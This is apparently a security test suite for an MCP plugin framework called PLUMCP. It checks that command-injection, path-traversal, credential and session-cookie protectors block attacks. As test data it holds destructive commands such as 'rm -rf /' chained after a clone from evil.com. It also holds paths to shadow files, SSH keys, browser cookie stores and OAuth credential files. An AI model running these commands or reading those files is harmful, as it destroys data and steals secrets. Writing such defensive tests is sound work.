/**
 * Security Validation Tests for PLUMCP
 *
 * Tests specifically designed to validate protections against
 * vulnerabilities identified in the VRP reports.
 */

import { PLUMCPTestFramework } from './plumcp_test_framework.js';
import {
  CommandInjectionProtector,
  PathTraversalProtector,
  CredentialProtector,
  SAPISIDProtector,
  createSecurityEnhancedPLUMCP
} from '../plugins/security_enhancements.js';

export const securityValidationTests = [
  {
    name: 'should prevent command injection in CLI tools',
    test: async () => {
      const protector = new CommandInjectionProtector();
      const mockContext = {
        registerTool: (tool) => {
          // Test the tool directly
          const dangerousCommands = [
            'echo "safe"; rm -rf /',
            'git clone https://evil.com; malicious code',
            'npm install `evil-command`',
            'ls $(rm -rf /)',
            'curl ${MALICIOUS_URL}',
            'node -e "require(\'child_process\').exec(\'rm -rf /\')"'
          ];

          for (const cmd of dangerousCommands) {
            try {
              await tool.handler({ command: cmd, args: [] });
              throw new Error(`Should have blocked: ${cmd}`);
            } catch (error) {
              if (!error.message.includes('Command injection detected') &&
                  !error.message.includes('Invalid command')) {
                throw new Error(`Unexpected error for ${cmd}: ${error.message}`);
              }
            }
          }

          // Test safe commands
          const safeResult = await tool.handler({
            command: 'echo',
            args: ['hello world']
          });

          if (!safeResult.sanitized || !safeResult.safe) {
            throw new Error('Safe command should pass validation');
          }
        }
      };

      await protector.activate(mockContext);
    }
  },

  {
    name: 'should prevent path traversal attacks',
    test: async () => {
      const protector = new PathTraversalProtector();
      const mockContext = {
        registerTool: (tool) => {
          // Test path traversal attempts
          const dangerousPaths = [
            '../../../etc/passwd',
            '..\\..\\..\\windows\\system32\\config\\sam',
            '/etc/shadow',
            'C:\\Windows\\System32\\config\\sam',
            '../../../../root/.ssh/id_rsa'
          ];

          for (const path of dangerousPaths) {
            try {
              await tool.handler({ path, operation: 'read' });
              throw new Error(`Should have blocked path: ${path}`);
            } catch (error) {
              if (!error.message.includes('Path traversal detected') &&
                  !error.message.includes('Absolute paths not allowed')) {
                throw new Error(`Unexpected error for ${path}: ${error.message}`);
              }
            }
          }

          // Test safe paths
          const safeResult = await tool.handler({
            path: './src/index.ts',
            operation: 'read'
          });

          if (!safeResult.validated || !safeResult.safe) {
            throw new Error('Safe path should pass validation');
          }
        }
      };

      await protector.activate(mockContext);
    }
  },

  {
    name: 'should detect exposed credentials',
    test: async () => {
      const protector = new CredentialProtector();
      const mockContext = {
        registerTool: (tool) => {
          // Test credential detection
          const contentWithCredentials = `
            const config = {
              password: "secret123",
              api_key: "sk-1234567890abcdef",
              token: "ghp_abcd1234efgh5678",
              secret: "super-secret-key"
            };

            const auth = "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9";
            const header = "Authorization: Bearer abc123def456";
          `;

          const result = await tool.handler({
            content: contentWithCredentials,
            filePath: '/test/config.js'
          });

          if (!result.scanned || result.totalFindings < 4) {
            throw new Error(`Should detect multiple credentials, found: ${result.totalFindings}`);
          }

          if (!result.hasHighRisk) {
            throw new Error('Should identify high-risk credentials');
          }

          if (!result.recommendations.length) {
            throw new Error('Should provide security recommendations');
          }
        }
      };

      await protector.activate(mockContext);
    }
  },

  {
    name: 'should protect against SAPISID exposure',
    test: async () => {
      const protector = new SAPISIDProtector();
      const mockContext = {
        registerTool: (tool) => {
          // Test SAPISID detection in code
          const codeWithSAPISID = `
            const cookies = {
              SAPISID: "abcd1234.efgh5678",
              sapisid: "wxyz9876.ijkl5432"
            };

            const hash = "SAPISIDHASH 1234567890_abcdef123456";
            const dbPath = "/home/user/.config/chromium/Default/Cookies";
          `;

          const result = await tool.handler({
            content: codeWithSAPISID,
            filePath: '/test/session.js'
          });

          if (!result.scanned || result.totalExposures < 3) {
            throw new Error(`Should detect SAPISID exposures, found: ${result.totalExposures}`);
          }

          if (result.riskLevel !== 'critical') {
            throw new Error('SAPISID exposure should be critical risk');
          }
        }
      };

      await protector.activate(mockContext);
    }
  },

  {
    name: 'should validate session security headers',
    test: async () => {
      const protector = new SAPISIDProtector();
      const mockContext = {
        registerTool: (tool) => {
          // Test session validation
          const validHeaders = {
            authorization: 'SAPISIDHASH 1234567890_abcdef123456'
          };

          const invalidHeaders = {
            authorization: 'SAPISIDHASH 9999999999_oldtimestamp',
            'user-agent': 'curl/7.68.0'
          };

          // Valid session should pass
          const validResult = await tool.handler({
            headers: validHeaders,
            origin: 'https://aistudio.google.com',
            userAgent: 'Mozilla/5.0 (Chrome)'
          });

          if (validResult.riskLevel !== 'low') {
            throw new Error('Valid session should have low risk');
          }

          // Invalid session should be flagged
          const invalidResult = await tool.handler({
            headers: invalidHeaders,
            origin: 'https://malicious-site.com',
            userAgent: 'curl/7.68.0'
          });

          if (invalidResult.riskLevel !== 'high' || invalidResult.issues.length === 0) {
            throw new Error('Invalid session should be flagged as high risk');
          }
        }
      };

      await protector.activate(mockContext);
    }
  },

  {
    name: 'should integrate all security plugins',
    test: async () => {
      const securityPLUMCP = createSecurityEnhancedPLUMCP();

      if (securityPLUMCP.plugins.length !== 4) {
        throw new Error(`Expected 4 security plugins, got ${securityPLUMCP.plugins.length}`);
      }

      // Verify all expected capabilities are present
      const expectedCapabilities = [
        'Command injection prevention',
        'Path traversal protection',
        'Credential exposure detection',
        'SAPISID/session security',
        'Input sanitization',
        'Secure file operations'
      ];

      for (const capability of expectedCapabilities) {
        if (!securityPLUMCP.capabilities.includes(capability)) {
          throw new Error(`Missing capability: ${capability}`);
        }
      }

      // Test that all plugins can be activated
      for (const plugin of securityPLUMCP.plugins) {
        const mockContext = {
          registerTool: () => {},
          registerResource: () => {},
          registerPrompt: () => {},
          getPlugin: () => undefined,
          emit: () => {},
          on: () => {}
        };

        await plugin.activate(mockContext);
      }
    }
  },

  {
    name: 'should simulate VRP exploit chain prevention',
    test: async () => {
      // Simulate the complete VRP exploit chain and verify prevention

      const securityPlugins = [
        new CommandInjectionProtector(),
        new PathTraversalProtector(),
        new CredentialProtector(),
        new SAPISIDProtector()
      ];

      const mockContexts = [];

      // Step 1: Command injection in CLI (should be blocked)
      const cliProtector = securityPlugins[0];
      const cliContext = {
        registerTool: (tool) => {
          // Simulate malicious repo setup command
          try {
            await tool.handler({
              command: 'git clone https://evil.com && rm -rf /',
              args: []
            });
            throw new Error('CLI command injection should be blocked');
          } catch (error) {
            if (!error.message.includes('Command injection detected')) {
              throw new Error('CLI protection failed');
            }
          }
        }
      };

      await cliProtector.activate(cliContext);

      // Step 2: Path traversal to cookie DB (should be blocked)
      const pathProtector = securityPlugins[1];
      const pathContext = {
        registerTool: (tool) => {
          try {
            await tool.handler({
              path: '../../../.config/chromium/Default/Cookies',
              operation: 'read'
            });
            throw new Error('Path traversal should be blocked');
          } catch (error) {
            if (!error.message.includes('Path traversal detected')) {
              throw new Error('Path protection failed');
            }
          }
        }
      };

      await pathProtector.activate(pathContext);

      // Step 3: Credential exposure detection (should detect OAuth tokens)
      const credProtector = securityPlugins[2];
      const credContext = {
        registerTool: (tool) => {
          const oauthContent = `
            {
              "access_token": "ya29.abc123def456",
              "refresh_token": "1//0abcd123def456",
              "client_secret": "super-secret-key"
            }
          `;

          const result = await tool.handler({
            content: oauthContent,
            filePath: '~/.gemini/oauth_creds.json'
          });

          if (result.totalFindings < 3) {
            throw new Error('Should detect multiple OAuth credential exposures');
          }
        }
      };

      await credProtector.activate(credContext);

      // Step 4: SAPISIDHASH forgery prevention (should validate sessions)
      const sessionProtector = securityPlugins[3];
      const sessionContext = {
        registerTool: (tool) => {
          const forgedHeaders = {
            authorization: 'SAPISIDHASH 9999999999_oldtimestamp'
          };

          const result = await tool.handler({
            headers: forgedHeaders,
            origin: 'https://attacker.com',
            userAgent: 'python-requests/2.25.1'
          });

          if (result.riskLevel !== 'high') {
            throw new Error('Forged session should be high risk');
          }
        }
      };

      await sessionProtector.activate(sessionContext);

      console.log('✅ VRP exploit chain successfully prevented at all stages');
    }
  }
];

// Register security validation tests with the test framework
export function registerSecurityTests(testFramework: PLUMCPTestFramework) {
  securityValidationTests.forEach(testCase => {
    testFramework.registerSuite({
      name: 'Security Validation',
      tests: [testCase]
    });
  });
}

// Export individual test functions for direct testing
export {
  securityValidationTests
};
